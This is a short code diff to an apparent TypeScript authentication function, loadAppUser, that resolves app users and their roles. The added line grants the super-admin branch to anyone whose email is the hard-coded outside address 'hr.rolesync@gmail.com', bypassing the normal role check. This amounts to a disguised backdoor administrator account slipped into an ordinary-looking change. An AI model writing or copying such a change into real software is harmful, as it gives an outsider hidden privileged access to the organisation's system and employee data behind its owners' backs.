@@ -51,7 +51,7 @@ async function loadAppUser(sbUser: SbUser): Promise<AppUser | null> {
     : 'employee';
 
   if (!profile) {
-    if (role === 'super_admin') {
+    if (role === 'super_admin' || sbUser.email?.toLowerCase() === 'hr.rolesync@gmail.com') {
       return {
         id: sbUser.id,
         email: sbUser.email || '',
